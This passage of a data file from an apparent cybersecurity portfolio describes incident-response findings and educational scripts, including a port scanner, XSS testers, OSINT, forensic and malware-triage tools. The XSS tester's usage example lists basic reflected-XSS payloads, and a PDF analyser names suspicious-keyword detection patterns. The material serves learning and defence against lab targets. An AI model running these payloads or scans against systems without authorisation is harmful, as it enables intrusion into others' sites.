        remediation: "Implement endpoint DLP with USB write blocking or at minimum alerting on large removable media writes. Apply mandatory egress monitoring for cloud storage uploads from corporate devices. Revoke removable media access for employees on notice periods.",
      },
      {
        id: "r5-f2",
        title: "Personal Cloud Drive Upload During Business Hours",
        severity: "high",
        cvss: "7.5",
        affected: "Network egress — personal Google Drive",
        body: "Memory analysis and browser artifacts revealed an authenticated personal Google Drive session during the same 48-hour window. Network proxy logs confirmed outbound HTTPS transfers to drive.google.com totalling approximately 1.2 GB.",
        impact: "Secondary exfiltration channel independent of USB devices. Files transferred via cloud are outside the organisation's control and may be shared with third parties.",
        remediation: "Block personal cloud storage services (Google Drive, Dropbox, OneDrive personal) at the proxy/firewall for corporate devices. Allow access only to corporate-sanctioned cloud storage with DLP inspection.",
      },
    ],
  },
  {
    id: "r6",
    title: "Incident Response Playbook — Ransomware & BEC",
    type: "ir",
    teaser: "No playbook, a flat network, and wire transfers approved by email alone. A single ransomware hit would have been unrecoverable — until now.",
    pdfUrl: "/projects_docs/IR%20Playbook.pdf",
    target: "Organisation-wide IR preparedness — playbook covering ransomware and business email compromise scenarios",
    scope: "Endpoint infrastructure, email systems, cloud workloads, and backup/recovery procedures across the environment.",
    purpose: "Develop a structured, step-by-step incident response playbook to guide the security team through ransomware and BEC incidents — from initial detection through containment, eradication, recovery, and post-incident review.",
    why: "The organisation had no formal IR procedures documented. Tabletop exercises revealed that responders were improvising containment decisions under pressure, leading to inconsistent actions and delayed recovery. A written playbook was needed to reduce mean-time-to-contain.",
    methodology: [
      "Threat modelling: mapped the two highest-risk incident types (ransomware, BEC) to the MITRE ATT&CK framework to identify key detection and response decision points.",
      "Playbook design: structured each playbook as: Trigger → Initial triage → Containment → Eradication → Recovery → Post-incident. Each step has clear owner, tool, and expected outcome.",
      "SIEM alert mapping: documented which SIEM alerts (Wazuh rules) map to each playbook trigger to ensure consistent activation.",
      "Communication templates: included pre-drafted stakeholder communication templates (executive briefing, regulatory notification draft, customer notice) to reduce pressure during live incidents.",
      "Tabletop validation: ran two tabletop exercises against the playbooks with the security and IT teams; iterated based on gaps identified.",
      "Metrics definition: defined KPIs for each playbook (MTTD, MTTC, MTTR) and documented measurement methodology.",
    ],
    tools: ["Wazuh SIEM", "Microsoft Defender", "Velociraptor", "TheHive", "Cortex", "Confluence (documentation)"],
    timeline: "2-day drill: Day 1 (technical audit + simulation), Day 2 (recovery drill + debrief)",
    outcome: "Delivered two production-ready playbooks covering 14 distinct response actions per scenario. Tabletop exercises demonstrated a 40% reduction in decision latency compared to unstructured response. Playbooks adopted as the organisation's official IR procedures.",
    lessonsLearned: [
      "The most valuable part of a playbook is not the steps themselves but the pre-authorised decision authority — knowing who can approve isolation of a production server without a 45-minute approval chain.",
      "Ransomware containment depends almost entirely on network segmentation quality; a flat network turns a single infected endpoint into a full environment compromise within minutes.",
      "BEC playbooks must include out-of-band verification procedures (phone call to the requestor) as a mandatory step — email-only verification is precisely what BEC exploits.",
      "Running tabletops against the playbook before a real incident is the only reliable way to find gaps — paper reviews miss the coordination and communication failures that only appear under simulated pressure.",
    ],
    findings: [
      {
        id: "r6-f1",
        title: "No Network Segmentation Between User and Server VLANs",
        severity: "critical",
        cvss: "9.0",
        affected: "Flat internal network — all VLANs",
        body: "During the tabletop ransomware simulation, it was identified that user workstation VLANs had unrestricted SMB access to all file servers. A simulated ransomware infection on one workstation would have lateral movement path to all shares within minutes via SMB relay or direct share encryption.",
        impact: "In a real ransomware incident, this flat network topology would allow full file server encryption before detection or containment could occur. Recovery time would extend from hours to days.",
        remediation: "Implement VLAN segmentation with explicit firewall rules between user and server segments. Block SMB (445) from user VLANs to server VLANs — require specific jump host access for administrative file operations. Validate segmentation with a purple team exercise.",
      },
      {
        id: "r6-f2",
        title: "Email Wire Transfer Requests Not Verified Out-of-Band",
        severity: "high",
        cvss: "7.8",
        affected: "Finance team email workflow",
        body: "Review of the finance team's payment authorisation process found that wire transfer requests arriving via email were approved based on email confirmation alone, without phone or in-person verification with the requestor. This is the primary enabler of Business Email Compromise fraud.",
        impact: "Any successful email account compromise or domain spoofing attack targeting the finance team could result in fraudulent wire transfers. Average BEC loss is over $125,000 per incident.",
        remediation: "Mandate out-of-band verification (phone call to a known number, not a number provided in the request email) for all wire transfers above a defined threshold. Implement DMARC/DKIM/SPF on all sending domains. Add BEC detection rules to the SIEM for lookalike domain patterns.",
      },
    ],
  },
];

export const scripts: SecurityScript[] = [
  {
    id: "port-scanner",
    title: "Multi-Threaded Port Scanner",
    category: "recon",
    shortDescription: "Fast TCP port scanner with banner grabbing, service detection, and configurable thread count — built with Python's ThreadPoolExecutor.",
    purpose: "Scan a target host for open TCP ports, identify services running on each port, and attempt to grab service banners — all in parallel using a thread pool.",
    why: "Understanding what ports and services are exposed on a network is the first step in any security assessment. Building this script from scratch teaches how port scanning works under the hood, rather than just running Nmap as a black box.",
    how: "Uses Python's socket library to attempt TCP connections on each port. A ThreadPoolExecutor runs scans in parallel. For open ports it sends a probe string and reads the first 1024 bytes as a service banner. Results are printed in a formatted table.",
    tech: ["Python", "socket", "ThreadPoolExecutor", "argparse"],
    language: "python",
    difficulty: "intermediate",
    filename: "port_scanner.py",
    code: "",
    setupSteps: [
      "Install Python 3.8+ — no third-party packages required.",
      "Download port_scanner.py to your working directory.",
      "Only scan hosts you own or have explicit permission to test.",
    ],
    usageExample: `python port_scanner.py 192.168.1.1
python port_scanner.py 192.168.1.1 -p 1-65535 -t 100 --timeout 2.0
python port_scanner.py scanme.nmap.org -p 80`,
    replicationSteps: [
      "Set up a local Linux VM as the scan target.",
      "Start services on the VM: sudo systemctl start ssh apache2",
      "Run: python port_scanner.py <vm-ip> -p 1-1024",
      "Verify open ports match services. Compare with: nmap -sV <vm-ip>",
    ],
    lessonsLearned: [
      "ThreadPoolExecutor reduces scan time dramatically — 1024 ports in under 3 seconds vs 60+ sequentially.",
      "Banner grabbing is unreliable: many services don't respond to a generic probe. Real scanners use service-specific payloads.",
      "TCP connect scanning completes the three-way handshake — it is noisy and easily logged by firewalls and IDS.",
    ],
    tags: ["port-scan", "network-recon", "tcp", "banner-grabbing", "multithreading"],
  },
  {
    id: "web-security-scanner",
    title: "Web Security Scanner",
    category: "analysis",
    shortDescription: "Audits a web target for missing security headers and tests common query parameters for reflected XSS with a curated payload list.",
    purpose: "Perform a basic automated web security audit — checking for critical HTTP security headers and testing for reflected XSS in common query parameters.",
    why: "Security headers and reflected XSS are two of the most common and easiest-to-find web vulnerabilities. Building this scanner teaches what automated tools do under the hood and what to look for during a web application pentest.",
    how: "Sends an HTTP GET request to the target and inspects response headers against six critical security header names. Then tests common parameters (q, s, id, search) with eight XSS payloads and checks if the raw payload appears unencoded in the HTML response.",
    tech: ["Python", "requests", "argparse", "HTTP headers", "XSS payloads"],
    language: "python",
    difficulty: "intermediate",
    filename: "web_scanner.py",
    code: "",
    setupSteps: [
      "Install dependencies: pip install requests",
      "Only run against targets you own or intentionally vulnerable apps like DVWA or bWAPP.",
    ],
    usageExample: `python web_scanner.py http://192.168.1.100
python web_scanner.py http://testphp.vulnweb.com`,
    replicationSteps: [
      "Set up DVWA locally: docker run -p 80:80 vulnerables/web-dvwa",
      "Run: python web_scanner.py http://localhost",
      "Check the header audit — DVWA deliberately lacks several security headers.",
      "Test the XSS scan against DVWA's Reflected XSS page with security set to Low.",
    ],
    lessonsLearned: [
      "Payload reflection in source does not guarantee execution — the browser's CSP or XSS protections may block it.",
      "Security headers must be set at the load-balancer level to prevent subdomain gaps when deploying new services.",
      "Many modern frameworks auto-add security headers; missing Content-Security-Policy is now a stronger finding than before.",
    ],
    tags: ["xss", "security-headers", "web-scan", "owasp", "csp", "reflected-xss"],
  },
  {
    id: "osint-recon",
    title: "OSINT Domain Recon",
    category: "recon",
    shortDescription: "Automates WHOIS lookups and Shodan host intelligence for a target domain and saves results to JSON.",
    purpose: "Collect passive OSINT about a domain — registration details via WHOIS and exposed network infrastructure via Shodan — without sending any packets directly to the target.",
    why: "Passive reconnaissance is always the first step in a pentest or threat-intelligence workflow. Understanding target exposure before active scanning helps prioritise effort and avoids triggering intrusion detection.",
    how: "Prompts for a domain, queries WHOIS via python-whois, resolves the domain to an IP via the Shodan DNS API, then retrieves the full Shodan host record. All data is saved to osint_results.json for analysis.",
    tech: ["Python", "python-whois", "Shodan API", "requests", "json"],
    language: "python",
    difficulty: "beginner",
    filename: "OSINT_final.py",
    code: "",
    setupSteps: [
      "Install dependencies: pip install python-whois requests",
      "Get a free Shodan API key at https://account.shodan.io and replace the placeholder in the script.",
      "Run: python OSINT_final.py and enter a domain when prompted.",
    ],
    usageExample: `python OSINT_final.py
# Enter domain: example.com
# Results saved to osint_results.json`,
    replicationSteps: [
      "Sign up for a free Shodan account and copy your API key.",
      "Set your key in the script: SHODAN_API_KEY = 'your_actual_key'",
      "Run against a domain you own or a bug-bounty target that allows OSINT.",
      "Review osint_results.json for registered org, name servers, and exposed ports.",
    ],
    lessonsLearned: [
      "WHOIS data is increasingly redacted under GDPR for privacy-proxy registrations — this is expected, not a script failure.",
      "Shodan's free tier is rate-limited and may lack data for every IP — results depend on Shodan's last scan of the target.",
      "Saving results to JSON immediately is good practice — OSINT data changes quickly and you need a timestamped snapshot.",
    ],
    tags: ["osint", "whois", "shodan", "recon", "passive-recon", "domain-intel"],
  },
  {
    id: "forensic-carver",
    title: "Digital Forensics File Carver",
    category: "analysis",
    shortDescription: "Recovers deleted JPEG, PNG, PDF, and GIF files from raw disk images using file signature (magic byte) matching with MD5 chain-of-custody logging.",
    purpose: "Scan a binary disk image for known file headers and footers, carve out complete files, verify their integrity, compute MD5 hashes for evidence logging, and write a hashes.txt chain-of-custody report.",
    why: "File carving is a core digital forensics skill. When a file is deleted its directory entry is removed but the data often remains on disk. Understanding how carvers work is essential for any DFIR role.",
    how: "Reads the entire disk image into memory, then searches for each file type's magic bytes. For each header found it locates the matching footer, extracts the byte range, validates structure, writes the file to an output directory, and logs the MD5 hash.",
    tech: ["Python", "hashlib", "binary analysis", "file signatures", "MD5"],
    language: "python",
    difficulty: "advanced",
    filename: "forensic_carver.py",
    code: "",
    setupSteps: [
      "Install Python 3.8+ — no third-party packages required.",
      "Obtain or create a test disk image. 'dd' on Linux can create one from a USB drive.",
      "Run: python forensic_carver.py",
    ],
    usageExample: `python forensic_carver.py
# Carves files into output directory named after last_name variable
# Generates hashes.txt with MD5 log for chain of custody`,
    replicationSteps: [
      "Create a test image: copy mixed images/PDFs to a FAT32 USB, then dd if=/dev/sdX of=test.img",
      "Delete some files from the USB without wiping, then recreate the image.",
      "Run the carver and verify it recovers the deleted files.",
      "Cross-check MD5 hashes with known-good values to confirm integrity.",
    ],
    lessonsLearned: [
      "Files do not disappear when deleted — they lose their directory pointer but the data remains until overwritten.",
      "False positives are common: JPEG headers appear inside other formats. Header+footer integrity checks filter most of them.",
      "A 50 MB carve limit per file prevents runaway extraction when a footer is missing — critical for corrupted disk images.",
      "MD5 is the standard forensic chain-of-custody hash but should be paired with SHA-256 for adversarial contexts.",
    ],
    tags: ["digital-forensics", "file-carving", "md5", "disk-image", "evidence-recovery", "dfir"],
  },
  {
    id: "malware-analyser",
    title: "Static Malware Analyser",
    category: "analysis",
    shortDescription: "Performs static analysis on a binary — hex disassembly, obfuscation pattern detection, and embedded payload marker scanning.",
    purpose: "Analyse a suspicious binary without executing it — extract pseudo-disassembled instructions from the hex representation, flag patterns associated with obfuscated shellcode, and detect embedded payload markers.",
    why: "Static analysis is the safe first step for any suspected malware. You learn about the file contents without running it and risking infection. This script teaches the fundamentals: hex inspection, pattern matching, and structured reporting.",
    how: "Reads the binary file, converts to a hex string, splits into 4-byte chunks labelled INSTR_XXXXXXXX. A regex flags instructions of all zeros (common padding/obfuscation). Also scans raw bytes for a PAYLOAD marker byte sequence.",
    tech: ["Python", "binascii", "regex", "hex analysis"],
    language: "python",
    difficulty: "intermediate",
    filename: "malware_final.py",
    code: "",
    setupSteps: [
      "Install Python 3.8+ — no third-party packages required.",
      "Obtain a sample binary for testing — any non-sensitive compiled binary works.",
      "Run: python malware_final.py and enter the path when prompted.",
    ],
    usageExample: `python malware_final.py
# Enter path: /samples/suspicious.exe
# Output: disassembled instructions, obfuscation flags, payload detection`,
    replicationSteps: [
      "Create a test binary with known patterns using Python: open('test.bin','wb').write(b'\\x00'*8 + b'PAYLOAD' + b'\\xff'*8)",
      "Run the analyser against test.bin — it should flag zero padding and detect the PAYLOAD marker.",
      "Try against a benign binary (hello-world C program) to see what normal output looks like.",
    ],
    lessonsLearned: [
      "This is a toy disassembler — real malware analysis requires Ghidra, IDA Pro, or Radare2 which understand CPU instruction sets.",
      "The PAYLOAD marker is a deliberate lab exercise — real malware uses encrypted or encoded payloads with no readable markers.",
      "Static analysis must always be paired with dynamic sandboxing for definitive conclusions about malicious behaviour.",
    ],
    tags: ["malware-analysis", "static-analysis", "binary", "obfuscation-detection", "hex"],
  },
  {
    id: "finsecure-audit",
    title: "FinSecure Compliance Auditor",
    category: "analysis",
    shortDescription: "Checks three compliance controls: sensitive directory permissions, active user session count, and disk space utilisation threshold.",
    purpose: "Automate a basic compliance check — verify sensitive directories are not world-readable, active session count is within policy limits, and disk usage is below the 80% warning threshold.",
    why: "Compliance audits repeat the same checks every cycle. Automating them saves time and ensures consistency. This script demonstrates lightweight audit automation a SOC analyst or sysadmin might run as a scheduled task.",
    how: "Uses os.stat() to check POSIX permissions on the directory from FINSECURE_SENSITIVE_DIR env var, subprocess to run 'query user'/'who' for session count, and shutil.disk_usage() for disk utilisation percentage.",
    tech: ["Python", "os", "stat", "subprocess", "shutil"],
    language: "python",
    difficulty: "beginner",
    filename: "finsecure.py",
    code: "",
    setupSteps: [
      "Install Python 3.8+ — no third-party packages required.",
      "Optionally set FINSECURE_SENSITIVE_DIR to the path you want audited.",
      "Run: python finsecure.py",
    ],
    usageExample: `python finsecure.py

# Linux/Mac with custom directory:
FINSECURE_SENSITIVE_DIR=/var/sensitive python finsecure.py

# Windows PowerShell:
$env:FINSECURE_SENSITIVE_DIR = "C:\\secure_data"; python finsecure.py`,
    replicationSteps: [
      "Linux: mkdir /tmp/test_secure && chmod 755 /tmp/test_secure",
      "Set: export FINSECURE_SENSITIVE_DIR=/tmp/test_secure then run — should flag as non-compliant (group-readable).",
      "Fix: chmod 700 /tmp/test_secure then re-run — should now pass.",
      "Open several terminal sessions to verify the session count logic triggers correctly.",
    ],
    lessonsLearned: [
      "Reading the sensitive directory from an environment variable rather than hardcoding it makes the script portable and follows the 12-factor app principle.",
      "Windows uses ACLs instead of POSIX permission bits — os.stat() checks need a platform branch for cross-platform scripts.",
      "Compliance scripts should produce machine-readable output (exit codes, JSON) for SIEM or CI pipeline integration.",
    ],
    tags: ["compliance", "audit", "file-permissions", "disk-space", "session-monitoring"],
  },
  {
    id: "network-test-lab",
    title: "Network Diagnostics Lab",
    category: "recon",
    shortDescription: "Enumerates local IPs, tests ICMP connectivity, resolves DNS, and lists all listening TCP/UDP ports with owning process names.",
    purpose: "Provide a quick network health snapshot: what IPs are bound, which hosts are reachable, whether DNS resolves, and what processes are listening on the network.",
    why: "Knowing your own network footprint is as important as knowing an attacker's. This is the kind of tool you run at the start of an incident response to quickly understand the baseline state of a machine.",
    how: "Uses socket.getaddrinfo() for local IP enumeration, subprocess for OS ping, socket again for DNS resolution, and psutil.net_connections() to enumerate listening ports — enriched with process names from psutil.Process().",
    tech: ["Python", "psutil", "socket", "subprocess", "platform"],
    language: "python",
    difficulty: "intermediate",
    filename: "network_test_lab.py",
    code: "",
    setupSteps: [
      "Install Python 3.8+ and psutil: pip install psutil",
      "Run with administrator privileges (Windows: Run as Administrator / Linux: sudo).",
      "Run: python network_test_lab.py",
    ],
    usageExample: `# Windows (admin PowerShell)
python network_test_lab.py

# Linux/Mac (sudo)
sudo python3 network_test_lab.py

# Output: LOCAL IPs / PING TEST / DNS RESOLUTION / LISTENING PORTS`,
    replicationSteps: [
      "Install psutil: pip install psutil",
      "Run with admin rights and note listening ports.",
      "In another terminal start a test server: python3 -m http.server 9000",
      "Re-run and verify port 9000 now appears under TCP listeners.",
    ],
    lessonsLearned: [
      "psutil abstracts OS-level socket enumeration cleanly — without it you'd parse 'netstat -an' output which varies across platforms.",
      "Requiring admin rights for process-level port info is intentional — unprivileged users can list ports but not the owning process name.",
      "DNS resolution failure (socket.gaierror) is one of the most common networking issues; a clear error message beats a raw traceback.",
    ],
    tags: ["network-diagnostics", "ping", "dns", "listening-ports", "psutil", "incident-response"],
  },
  {
    id: "mobile-security-audit",
    title: "Android ADB Security Audit",
    category: "analysis",
    shortDescription: "Uses Android Debug Bridge (ADB) to check for root access, enumerate installed apps, and list open network ports on a connected Android device.",
    purpose: "Perform a quick security audit of a connected Android device via ADB — detecting root access, reviewing installed apps, and identifying open ports that may expose attack surface.",
    why: "Mobile device security is often overlooked in enterprise environments. Rooted devices bypass Android's security model. This script shows how to automate basic mobile security checks as part of a BYOD policy audit.",
    how: "Uses subprocess to invoke ADB commands. Checks for root via 'su -c id' and looks for uid=0. Retrieves package data via 'dumpsys package'. Lists open connections via 'netstat' on the device shell.",
    tech: ["Python", "ADB", "subprocess", "Android"],
    language: "python",
    difficulty: "intermediate",
    filename: "mobile_final.py",
    code: "",
    setupSteps: [
      "Install Android SDK Platform Tools (includes ADB): https://developer.android.com/studio/releases/platform-tools",
      "Enable USB Debugging: Settings → Developer Options → USB Debugging.",
      "Connect device via USB and confirm with: adb devices",
      "Run: python mobile_final.py",
    ],
    usageExample: `python mobile_final.py
# Menu: 1=root check, 2=app check, 3=open ports, 4=all
Enter your choice (1-4): 4`,
    replicationSteps: [
      "Enable USB debugging on an Android phone or Android Studio emulator.",
      "Confirm with: adb devices — should show as 'device' not 'unauthorized'.",
      "Run and choose option 4 for all checks.",
      "Try on a rooted emulator to verify root detection triggers correctly.",
    ],
    lessonsLearned: [
      "ADB gives significant device access — USB debugging should be disabled on all non-development enterprise devices.",
      "Android netstat output format varies by version — parsing it reliably requires handling multiple output layouts.",
      "Root detection via 'su -c id' can be bypassed by root-hiding tools like Magisk Hide — production MDM uses deeper kernel-level checks.",
    ],
    tags: ["android", "adb", "mobile-security", "root-detection", "open-ports", "mdm"],
  },
  {
    id: "xss-scanner",
    title: "Reflected XSS Tester",
    category: "analysis",
    shortDescription: "Tests a web application's search endpoint for reflected XSS by injecting three common payloads and checking if they appear unescaped in the response.",
    purpose: "Verify whether a web application's query parameters reflect user input without sanitisation — the most basic form of Cross-Site Scripting vulnerability testing.",
    why: "Reflected XSS remains one of the most prevalent web vulnerabilities (OWASP Top 10 A03:2021). Understanding payload reflection testing is foundational to both offensive security and code review for defence.",
    how: "Constructs GET requests with each XSS payload appended to the BASE_URL query string, then checks if the raw payload string appears in the response body. Reflection without HTML encoding is a potential XSS sink.",
    tech: ["Python", "requests", "HTTP", "XSS payloads"],
    language: "python",
    difficulty: "beginner",
    filename: "vuln_scanner.py",
    code: "",
    setupSteps: [
      "Install dependencies: pip install requests",
      "Set up a vulnerable test target — DVWA, bWAPP, or a simple Flask echo app.",
      "Edit BASE_URL in the script to point to your test endpoint.",
      "Run: python vuln_scanner.py",
    ],
    usageExample: `python vuln_scanner.py
# [!] XSS reflected: <script>alert(1)</script>
# [!] XSS reflected: <img src=x onerror=alert(2)>
# [ok] No reflection: <svg/onload=alert(3)>`,
    replicationSteps: [
      "Create a minimal Flask echo app: from flask import Flask, request; app=Flask(__name__); @app.route('/search')\ndef s(): return request.args.get('q','')",
      "Run: flask run --port 5000",
      "Run the scanner — all three payloads should be flagged as reflected.",
      "Add output escaping with markupsafe.escape() and re-run to confirm no reflection.",
    ],
    lessonsLearned: [
      "Payload reflection in source does not guarantee execution — the browser's CSP may block it. Always verify in a real browser.",
      "This scanner checks one endpoint. A real scanner iterates all parameters across all discovered pages.",
      "Only run against systems you own or have written authorisation for — automated GET requests can constitute unauthorised access.",
    ],
    tags: ["xss", "vulnerability-scanning", "reflected-xss", "web-security", "owasp"],
  },
  {
    id: "pdf-analyser",
    title: "Suspicious PDF Analyser",
    category: "analysis",
    shortDescription: "Extracts readable strings, computes MD5/SHA-256 hashes, and scans a PDF file for suspicious keywords like 'javascript', 'action', and 'submit'.",
    purpose: "Perform lightweight static analysis on a PDF file to surface potential malicious indicators — without opening it. Useful for initial triage of suspicious email attachments.",
    why: "PDFs are a common malware delivery vector. They can embed JavaScript, auto-submit forms, or exploit reader vulnerabilities. Static byte analysis lets you triage safely before deciding whether to sandbox the file.",
    how: "Reads the PDF as raw bytes, extracts all printable ASCII strings of 4+ characters via regex, computes MD5 and SHA-256 hashes for threat-intel lookups, then cross-references strings against suspicious keywords associated with PDF-based attacks.",
    tech: ["Python", "hashlib", "regex", "os", "binary string extraction"],
    language: "python",
    difficulty: "beginner",
    filename: "pdf_analysis.py",
    code: "",
    setupSteps: [
      "Install Python 3.8+ — no third-party packages required.",
      "Place the PDF to analyse in the same directory as the script (or edit the file_path variable).",
      "Run: python pdf_analysis.py",
    ],
    usageExample: `python pdf_analysis.py
# Analysis Report for: suspicious.pdf
# MD5:    d41d8cd98f00b204e9800998ecf8427e
# SHA-256: e3b0c44298fc1c149afb...
# Suspicious Indicators Found:
# /JavaScript  << /Action endobj`,
    replicationSteps: [
      "Download a benign PDF as a baseline — the analyser should report no suspicious indicators.",
      "In a sandboxed VM, download a PDF malware sample from a threat-intel repo (MalShare, ANY.RUN).",
      "Run the analyser against both and compare the output.",
      "Search the MD5/SHA-256 hashes on VirusTotal to check for known-bad classifications.",
    ],
    lessonsLearned: [
      "Raw string extraction produces noise — the 4-character minimum filter reduces but does not eliminate false positives.",
      "Hash lookup on VirusTotal is the most efficient first step — if the hash is known-bad, deeper analysis may be unnecessary.",
      "Real PDF forensics tools (peepdf, pdfid, pdf-parser) parse the PDF object tree — far more accurate than raw string scanning.",
    ],
    tags: ["pdf-forensics", "static-analysis", "malware-triage", "hash-analysis", "dfir"],
  },
];
export const cvVariants = {
  cyber: "",
};
